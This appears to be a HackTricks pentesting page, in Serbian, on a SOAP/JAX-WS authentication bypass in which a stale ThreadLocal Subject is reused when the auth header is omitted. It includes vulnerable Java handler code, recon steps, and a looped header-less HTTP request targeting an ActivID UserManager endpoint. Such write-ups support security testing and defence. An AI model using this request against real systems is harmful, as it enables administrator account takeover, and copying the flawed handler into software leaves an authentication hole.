# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Neki middleware lanci čuvaju autentifikovani `Subject`/`Principal` unutar statičkog `ThreadLocal` i osvežavaju ga samo kada stigne proprietarni SOAP header.
- Pošto WebLogic/JBoss/GlassFish recikliraju radničke niti, izostavljanje tog header-a dovodi do toga da poslednji privilegovani `Subject` obrađen u toj niti bude tiho ponovo korišćen.
- Napadajte ranjivi endpoint slanjem zahteva bez header-a, ali sa dobro formiranim SOAP telima, sve dok ponovo korišćena nit ne dodeli ukradeni administratorski kontekst.

## Osnovni uzrok

Handler-i slični sledećem prepisuju identitet u thread-local samo kada je prilagođeni header prisutan, tako da kontekst prethodnog zahteva preživi:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Recon

1. Enumerišite reverse proxy / routing pravila da locirate skrivene SOAP strukture koje mogu blokirati `?wsdl` ali prihvataju POST-ove (mapirajte ih uz tok u [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Raspakujte EAR/WAR/EJB artefakte (`unzip *.ear`) i pregledajte `application.xml`, `web.xml`, `@WebService` anotacije i handler chains (npr. `LoginHandlerChain.xml`) da otkrijete handler klasu, SOAP header QName i imena pozadinskih EJB-ova.
3. Ako metadata nedostaje, brute-force-ujte verovatne `ServiceName?wsdl` putanje ili privremeno opustite lab proxy-je, zatim importujte bilo koji oporavljeni WSDL u alate kao što je [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) da generišete osnovne envelope.
4. Pregledajte handler izvore za `ThreadLocal` čuvare (npr. `SubjectHolder.setSubject()`) koji se nikada ne brišu kada autentifikacioni header nedostaje ili je neispravan.

## Exploitation

1. Pošaljite validan zahtev **sa** proprietarnim header-om da saznate normalne response kodove i eventualne greške koje se koriste za nevažeće tokene.
2. Ponovo pošaljite isti SOAP body dok izostavljate header. Održavajte XML dobro-formiranim i poštujte potrebne namespaces kako bi handler uredno izašao.
3. Loop-ujte zahtev; kada dospe na thread koji je ranije izvršio privilegovanu akciju, ponovo upotrebljen `Subject` otključava zaštićene operacije poput user ili credential manager-a.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Potvrđivanje buga

- Poveži JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) ili slične debugging hooks da nadgledaš sadržaj `ThreadLocal` pre i posle svakog poziva, potvrđujući da je neautentifikovani zahtev nasledio prethodni administratorski `Subject`.

## Reference

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
